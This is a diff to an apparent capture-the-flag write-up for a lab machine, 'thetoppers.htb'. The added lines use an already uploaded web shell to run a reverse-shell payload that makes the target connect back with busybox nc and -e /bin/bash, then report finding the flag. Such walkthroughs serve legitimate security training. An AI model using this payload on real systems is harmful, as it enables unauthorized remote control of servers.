@@ -162,3 +162,12 @@ Our shell is uploaded we can now access it from the web server
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/160695da-44ce-4075-b9a4-a9b232a2737b)
 
 We are user *www-data* let's get a reverse shell
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/efaacc43-3347-4c0b-9e5e-77209a9cc50c)
+
+```
+Payload: http://thetoppers.htb/shell.php?cmd=busybox%20nc%2010.10.14.27%201337%20-e%20/bin/bash
+```
+
+The flag is there :)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6d8b5859-4869-4bef-b640-33204ac41102)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/02f1f4a3-c853-4895-98f2-cdaccb64d883)
